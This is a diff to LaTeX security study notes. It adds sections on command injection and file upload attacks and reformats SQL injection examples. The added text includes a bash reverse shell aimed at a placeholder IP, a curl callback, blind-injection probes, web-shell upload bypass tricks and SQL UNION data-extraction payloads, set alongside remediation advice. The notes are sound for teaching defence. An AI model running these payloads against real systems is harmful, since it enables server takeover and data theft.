@@ -815,7 +815,106 @@ A \textbf{web proxy}is software that sits between your browser and target web se
     \item New kid on the block, slower feature releases and fewer integrations than its alternatives.
 \end{itemize}
 
+
 \section*{Web Exploitation}
+
+\subsection*{Command Injection}
+
+f apps pass input directly to the command line without any checks, you can add extra commands.
+
+\subsubsection*{Command Injection: How It Works}
+
+\paragraph*{Shell Separators}
+
+Standard shell features that work exactly as intended if the input reaches the shell.
+
+\begin{itemize}
+    \item \texttt{;} \textbf{semicolon}: runs the next command
+    \item \texttt{|} \textbf{pipe}: sends the output of the first command to the second
+    \item \texttt{\&\&} \textbf{double ampersand}: runs the second command only if the first succeeded
+    \item \texttt{||} \textbf{double pipe}: runs the second command only if the first one failed
+\end{itemize}
+
+\paragraph*{Blind Command Injection}
+
+\begin{itemize}
+    \item \texttt{; sleep 5 --} \textbf{Time Delay}: If the response takes longer than 5 seconds, likely indicates injection.
+    \item \texttt{; echo test > /var/www/html/proof.txt --} \textbf{File Write}: check if the file was written and now hosted
+    \item \texttt{; curl https://YOUR-IP/ --} \textbf{Network Callback}: check for the request arriving on your server
+\end{itemize}
+
+\subsubsection*{Command Injection: Examples}
+
+\begin{itemize}
+    \item \textbf{Vulnerable Ping Tool}: \texttt{192.168.1.1; whoami}
+    \item \textbf{Reverse Shell (Linux)}: Grants interactive terminal on the server.
+        \begin{itemize}
+            \item \texttt{; bash -i >\& /dev/tcp/<YOUR-IP>/4444 0>\&1}
+            \item \textit{(On local:)} \texttt{nc -lvnp 4444}
+        \end{itemize}
+\end{itemize}
+
+\subsubsection*{Command Injection: Impact and Remediation}
+
+\begin{itemize}
+    \item \textbf{\textcolor{red}{What Attackers Can Do}}
+        \begin{itemize}
+            \item Run any OS command on the web server.
+            \item Read sensitive files such as \texttt{/etc/shadow}, config files, source code.
+            \item Full interactive reverse shell on the server.
+            \item Install backdoors or malware.
+            \item Use the server to attack other machines on the internal network.
+            \item Rated \textbf{Critical}, indicates full server compromised.
+        \end{itemize}
+    \item \textbf{\textcolor{green}{Fixes and Mitigations}}
+        \begin{itemize}
+            \item Never pass user input directly to a shell command.
+            \item \textbf{Input Sanitization}: Only allow expected characters with strict input validation.
+            \item Use language built-in functions instead of shell commands where possible.
+            \item \textit{(Python)}: Use subprocess with a list of arguments and \texttt{shell=False:}.
+            \item Run the web server as a low-privilege user so damage is limited if injection does occur.
+        \end{itemize}
+\end{itemize}
+
+\subsection*{File Upload Attacks}
+
+Attackers can upload malicious files.
+
+\subsubsection*{Web Shells}
+
+Uploaded to web servers to allow attackers to run commands on the server.
+
+\begin{enumerate}
+    \item Uploaded file must be saved somewhere the web server can serve it.
+    \item Server must execute the file as code rather than just serving it as a download.
+\end{enumerate}
+
+For example, Apache servers with PHP enabled will run \texttt{.php} files it receives a request for. Webshells can thus be written in PHP.
+
+\paragraph*{Extension Blacklist Bypass}
+
+Some apps may block the \texttt{.php} extension but not every PHP extension that exists.
+
+\begin{itemize}
+    \item Try \texttt{.phtml}, \texttt{.php5}, \texttt{.phar}, \texttt{.shtml}, or \texttt{.pHp}.
+    \item Try \textbf{double extensions}: \texttt{shell.php.jpg}
+\end{itemize}
+
+\paragraph*{MIME Type Bypass}
+
+\begin{itemize}
+    \item Browser sends a \texttt{Content-Type} header indicating file-type: (\texttt{application/x-php}).
+    \item Use \textbf{Burp Suite} to catch outgoing request and change \texttt{Content-Type}: (\texttt{image/jpeg})
+    \item Server thinks it received a \texttt{.jpeg} but the underlying file is still a PHP script.
+\end{itemize}
+
+\paragraph*{Magic Bytes Bypass}
+
+\begin{itemize}
+    \item Some servers check the first few bytes of the file to detect its type.
+    \item GIF files start with the bytes \texttt{GIF89a}. Append this to the beginning of the PHP script.
+    \item File still executes as PHP because PHP ignores start bytes.
+\end{itemize}
 
 \subsection*{SQL Injection}
 
@@ -853,12 +952,14 @@ If apps build queries to SQL databases without \textbf{input sanitization} (thus
             \item If we input the username as: \texttt{admin'--}
             \item The \texttt{--} turns everything after it into a comment, effectively bypassing the password check.
         \end{itemize}
-    \item \textbf{Extracting Data with UNION (MySQL)}
-        \begin{itemize}
-            \item \texttt{'UNION SELECT <table\_name>,NULL FROM information\_schema.tables--}
-            \item \texttt{'UNION SELECT <column\_name>,NULL FROM information\_schema.columns WHERE table\_name='users'--}
-            \item \texttt{'UNION SELECT username,password FROM users--}
-        \end{itemize}
+    \item \textbf{Extracting Data with \texttt{UNION} (MySQL)}
+        \begin{sloppypar}
+            \begin{itemize}
+                \item \texttt{'UNION SELECT <table\_name>,NULL FROM information\_schema.tables--}
+                \item \texttt{'UNION SELECT <column\_name>,NULL FROM information\_schema.columns WHERE table\_name='users'--}
+                \item \texttt{'UNION SELECT username,password FROM users--}
+            \end{itemize}
+        \end{sloppypar}
     \item \textbf{Time-Based Blind Detection}
         \begin{itemize}
             \item \texttt{'AND SLEEP(5)--} \textit{(MySQL)}
